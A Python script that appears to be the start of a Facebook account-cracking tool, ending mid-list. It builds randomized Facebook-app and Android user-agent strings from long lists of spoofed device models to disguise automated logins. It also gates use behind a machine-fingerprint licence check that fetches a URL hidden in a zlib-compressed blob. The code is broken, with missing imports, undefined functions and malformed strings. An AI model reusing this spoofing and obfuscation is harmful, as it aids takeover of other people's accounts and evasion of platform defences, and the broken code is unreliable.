import requests
import os
from bs4 import BeautifulSoup
import os
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
#━━━━[ COLORS ]━━━━#
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\x1b[38;5;190m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\x1b[97;1m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white,blue,green,orange,rad,yellow,yelloww,blue,purple,cyan];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []
ck = []
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+''
#━━━━[ BANNER/LOGO ]━━━━#
def key():
    uID = hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
    return uID.upper()
def generate_key():
    myid = key()
    try:
        print(f'{rad}[{white}×{rad}] {green}Checking For Subscription')
        lik = str(zlib.decompress(b'x\x9c\x05\xc1Q\x0e\x80 \x08\x00\xd0\x1bIh_m\xad\xb3PV\xb0\x898\xe1\xa3\xe3\xf7\x1eG\x0c\xdf\x00\x94\x98\xaa09uz\xa6T\xc1\xb5\xa4\xb3\xd9\xeb\xc3"]\xa6\x90\x97\\\x003\x8c{\xaa\xb8\x8b\xf5\xf8"qh;t\xc7\x1f\xb2\xf2\x19\xa4')).replace("b'", "").replace("'", "")
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, lik)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()
        body = buffer.getvalue().decode('utf-8')
        response = body
        if myid in response:
            __L_S__()
        else:
            fuckxd()
            ceyx = key()
            print(f"{rad}[{white}×{rad}] {green}IF YOU NEED FREE APPROVAL CONTACT ADMIN")
            linex()
            os.system('xdg-open https://www.facebook.com/M4HADI.143')
            time.sleep(2)
            sys.exit()
    except Exception as e:
        exit('\n Network connection error ')
#--------------------------------[METHOD 1]--------------------------------#
def mls1():
    END = '[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683426;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/VodaCom-SA;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 2]--------------------------------#
def mls2():
    END = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/VodafoneNZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-S7275T;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]'
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 3]--------------------------------#
def mls3():
    END = '[FBAN/FB4A;FBAV/446.0.0.28.352;FBBV/448411340;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/Mahadix3 IN;FBMF/TOSHIBA;FBBD/TOSHIBA;FBPN/com.facebook.katana;FBDV/TOSHIBA ALL SERIES;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 4]--------------------------------#
def mls4():
    END = '[FBAN/FB4A;FBAV/446.0.0.28.352;FBBV/448411340;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Ufone;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto X;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 5]--------------------------------#
def mls5():
    END = '[FBAN/FBW;FBAV/93.0.0.64.0;FBBV/62624619;FBDV/WindowsDevice;FBMD/Inspiron 3650;FBSN/Windows;FBSV/10.0.15063.540;FBSS/1;FBCR/Airtel;FBID/desktop;FBLC/en_US;FBOP/45;FBRV/0]'
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 6]--------------------------------#
def mls6():
    END = '[FBAN/FB4A;FBAV/446.0.0.28.352;FBBV/448411340;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Ufone;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto X;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[NORMAL MTD]--------------------------------#
import requests,random
rao = random.choice(['CE7', 'CE7j', 'CE9h','KE6', 'KE6j', 'KF6','KE7','LC8','KD6a','LD7', 'LD7j', 'MZ-TECNO LD7','KF6', 'KF6j', 'KF6i', 'KF6k', 'PR651h', 'PR651', 'PR651E', 'KF6m', 'KF6h', 'KF6n'])
brook=random.choice(['X38','C65023','C6506','C6502','D6503','D6502','Xperia Z2','D6633','D6603','D6643','D6616','D6708','D6563','F5122','F5121','E6633','E5553','E6533','E5333'])
viv = random.choice(['2022','2023','2024','2027','2005','2005A','2002A','1955A','1962','1945A','1945T','1937','1938','1938CT','1938T','1940','1935','1936A','1933','1934A','1930A','1930T','1927','1928','1928A','1922A','1923A','1921','1921A','1921T','1915','1916','1908','1909','1832A','1832T','1831A','1831T','1824A','1824BA','1817','1818','1814','1815','1816','1727','1730','1718','1719','1723','1724','1725','1601','1606','F1403','2109','2111','2080A','2085A','2072A','2073A','2056A','2054A','2057A','2047','2037','2036','2038'])
vmo = random.choice(['1902','1906','1901','1904','1938CT','1723','1940','1928A','1909'])
rmx = random.choice(['RMX1941','RMX1945','RMX1921','RMX1901'])
poc = random.choice(['SM-M045F', 'SM-M045F/DS','SM-T509','SM-A042F', 'SM-A042F/DS', 'SM-A042M', 'SM-A042M/DS','SM-A047F', 'SM-A047F/DS', 'SM-A047F/DSN','SM-A045F', 'SM-A045F/DS','SM-M136B', 'SM-M136B/DS',])
gtp = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
son = random.choice(['H8324', 'H8314', 'SO-05K','XQ-AU51', 'XQ-AU52','XQ-AT51', 'XQ-AT52', 'SOG01','SO-52A', 'XQ-AS52', 'XQ-AS62', 'XQ-AS72', 'A002SO, SOG02'])
rot = random.choice(['HUAWEIMYA-L03', 'HUAWEIMYA-L23', 'HUAWEIMYA-L02', 'HUAWEIMYA-L22', 'HUAWEIMYA-U29', 'HUAWEIMYA-L13'])
cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
zov = random.choice(['LE2113', 'LE2111', 'LE2110', 'LE2117', 'LE2115','LE2121', 'LE2125', 'LE2123', 'LE2120', 'LE2127','EB2101', 'EB2103','DE2118', 'DE2117','DN2101', 'DN2103','MT2110', 'MT2111'])
mmn = random.choice(['LM-V510N','SM-G970F','SM-A107M','OnePlus BE2015','OnePlus BE2025','OnePlus BE2028','HUAWEI MAR-LX1M','Pixel 3','SM-G996U','SM-G980F','SM-G960U','HUAWEI MAR-LX1A','CP3503L','Coolpad 2039','SM-A025G','SM-J610FN','LG-D802','LG L40','LMK200Z', 'LMK200E', 'LMK200B', 'LM-K200'])
hwi = random.choice(['YAL-L21','ELE-L04','LYA-L29','ELE-L29','VOG-L09','MAR-LX1B','HLK-AL00','JNY-LX2','MAR-LX3A'])
tco = random.choice(['RB8S','KC8S','KC6','KC2','CC7','CB7'])
bio = random.choice(['SM-G6100', 'SM-G610L', 'SM-G610K','SM-G615F', 'SM-G615FU','SM-J730G', 'SM-J730GM','SM-G9298','SM-G615F, SM-G615FU','SM-C7010', 'SM-C701F', 'SM-C7018','SM-J710FN','SM-A520F', 'SM-A520F', 'SM-A520K', 'SM-A520L', 'SM-A520S', 'SM-A520W','SM-A720F', 'SM-A720S','SM-C5010', 'SM-C5018','SM-C9000', 'SM-C900F', 'SM-C9008', 'SM-C900Y','SM-A8100', 'SM-A810F', 'SM-A810F', 'SM-A810YZ', 'SM-A810S','SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M','SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M','SM-G388F', 'R3','SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M','SM-J701F', 'SM-J701F', 'SM-J701M', 'SM-J701MT','SO-02H', 'E5823', 'E5803','SM-J720F', 'SM-J720F/DS', 'SM-J720M', 'SM-J720M/DS','X00ID', 'X00IS', 'X00HDA', 'ZC554KL','XT1766', 'XT1763','G3116', 'G3121', 'G3112', 'G3123', 'G3125','SM-A605FN', 'SM-A605G', 'SM-A605F', 'SM-A605GN', 'SM-A6050', 'SM-A605K', 'SM-A605X', 'SM-A6058','SM-A750F', 'SM-A750FN', 'SM-A750G', 'SM-A750GN', 'SM-A750C', 'SM-A750X', 'SM-A750N','SM-G885F', 'SM-G8850', 'SM-G885Y', 'SM-G885S', 'SM-G8858','SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M','SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M','SM-G388F', 'R3','SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M','SM-J250F', 'SM-J250G', 'SM-J250F', 'SM-J250M', 'SM-J250Y','SM-A260F', 'SM-A260G','SM-G532F','SM-G532G', 'SM-G532M', 'SM-G532G', 'SM-G532F', 'SM-G532MT','MT7-TL00', 'MT7-L09', 'MT7-TL10', 'MT7-CL00', 'MT7-UL00','PRA-TL10', 'PRA-TL20', 'PRA-LA1', 'PRA-LX1', 'PRA-LX2', 'TAG-L21', 'PRA-AL00X', 'TAG-L32', 'PRA-LX3', 'PRA-AL00','EVA-L09', 'EVA-L19', 'EVA-L29', 'EVA-AL10', 'EVA-TL00', 'EVA-AL00', 'EVA-DL00','SLA-L02', 'SLA-L22', 'SLA-L03', 'SLA-L23','WAS-LX1', 'WAS-LX2', 'WAS-LX3', 'WAS-LX1A', 'WAS-LX2J', 'WAS-L03T', 'WAS-AL00', 'WAS-TL10','POT-LX1', 'POT-LX1AF', 'POT-LX2J', 'POT-LX1RUA', 'POT-LX3','HMA-L09', 'HMA-LX9', 'HMA-L29', 'HMA-AL00', 'HMA-TL00','LIO-L09', 'LIO-L29', 'LIO-AL00', 'LIO-TL00','MYA-L03', 'MYA-L23', 'MYA-L02, MYA-L22', 'MYA-U29', 'MYA-L13','DUB-LX1', 'DUB-LX3','DUB-LX1'])
mui = random.choice(['M2004J19G', 'M2004J19C'])
red = random.choice(['M1803E6G', 'M1803E6H', 'M1803E6I','M1803E7SG', 'M1803E7SH','M1804C3DG', 'M1804C3DH', 'M1804C3DI','M1806E7TG', 'M1806E7TH', 'M1806E7TI','M2004J19G', 'M2004J19C'])
bik = random.choice(['X017DA','X018D','A009','X00LD','X015D','Z01KS','Z01MDA','ASUS_X00KD','ASUS_A002A','ASUS_X013'])
inf = random.choice(['X682B', 'X682C','X680B','X688B'])
inform = random.choice(['PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
def ua_valid():
    rr = random.randint
    rc = random.choice
    model = random.choice([inf,inform,bik,red,mui,bio,tco,hwi,mmn,rmx,zov,cph,rot,son,gtp,poc,vmo,viv])
    redmi4 = f"Mozilla/5.0 (Linux; Android 13; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])

agents = [
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
"Mozilla/5.0 (Linux; Android 11; I1927) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L523T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4782.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M349Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4755.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S840H) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4283.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J425L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4552.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B975X) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4251.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P472Z) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4861.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q844J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4682.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q722F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4880.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B779Z) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4882.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K782V) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4655.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L965Z) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4386.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O868O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4210.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D432P) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4221.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C63T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4801.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S815O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4727.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A669J) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4868.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y536Z) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4893.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y610J) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y907L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4684.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J775N) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4760.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R132G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4247.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y278P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4789.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N344N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4220.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A741P) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4688.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z235C) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4616.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K314J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4387.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D553Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4594.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N569N) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4885.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S335R) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4319.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)S102C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4624.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E473M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4362.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L431O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4416.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W337Q) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4598.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S680Y) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4370.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q341X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4444.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q123K) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4339.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F702H) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4886.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C346X) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4362.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W907P) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4272.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S675P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4875.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S242A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4746.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D125S) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4511.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O690L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4827.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T191S) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4757.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H70Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4544.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J758G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4422.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M860R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4594.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q194M) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4889.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y170X) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4817.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A706W) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4405.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I883A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D264R) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4466.91 